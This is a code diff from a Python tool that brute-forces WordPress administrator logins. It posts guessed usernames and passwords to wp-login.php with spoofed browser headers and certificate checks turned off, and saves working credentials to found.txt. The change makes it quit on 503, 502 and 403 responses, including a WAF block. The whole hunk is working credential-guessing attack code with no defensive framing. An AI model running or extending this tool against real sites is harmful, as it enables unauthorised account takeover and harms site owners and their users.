@@ -116,15 +116,25 @@ def test_login (url,user,password,cnt,attempts):
 	headers = {"Origin":""+url+"","Accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8","Upgrade-Insecure-Requests":"1","User-Agent":"Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:75.0) Gecko/20100101 Firefox/75.0","Connection":"close","Accept-Language":"en-US,en;q=0.5","Accept-Encoding":"gzip, deflate","Content-Type":"application/x-www-form-urlencoded"}
 	cookies = {"wordpress_test_cookie":"WP+Cookie+check"}
 	response = session.post(""+url+"/wp-login.php?redirect_to="+url+"/wp-admin/", data=paramsPost, headers=headers, cookies=cookies,verify=False, proxies=proxyDict,allow_redirects = False)
+	if response.status_code == 503:
+		print("[-] Website is giving 503 HTTP Status [-]")
+		sys.exit(0)
+	if response.status_code == 502:
+		print("[-] Website is giving 502 HTTP Status [-]")
+		sys.exit(0)
+	if response.status_code == 403:
+		print("[-] Website is giving 403 HTTP Status  - WAF Blocking[-]")
+		sys.exit(0)
 	if "Google Authenticator code" in response.text:
 		print("[-] 2FA is enabled Sorry [-]")
 		sys.exit(0)
-	if "wordpress_logged_in" in response.headers['Set-Cookie']:
-		print("[+] Found Login Username: "+user+" Password: "+password+" on attempt "+str(cnt)+" [+]")
-		text_file = open("found.txt", "a")
-		text_file.write(""+url+" Found Login Username: "+user+" Password: "+password+"\n")
-		text_file.close()
-		sys.exit(0)
+	if response.headers['Set-Cookie']:
+		if "wordpress_logged_in" in response.headers['Set-Cookie']:
+			print("[+] Found Login Username: "+user+" Password: "+password+" on attempt "+str(cnt)+" [+]")
+			text_file = open("found.txt", "a")
+			text_file.write(""+url+" Found Login Username: "+user+" Password: "+password+"\n")
+			text_file.close()
+			sys.exit(0)
 	else:
 		print("[-] Login Failed for Username: "+user+" Password: "+password+" on attempt "+str(cnt)+" [-]")
 	cnt += 1
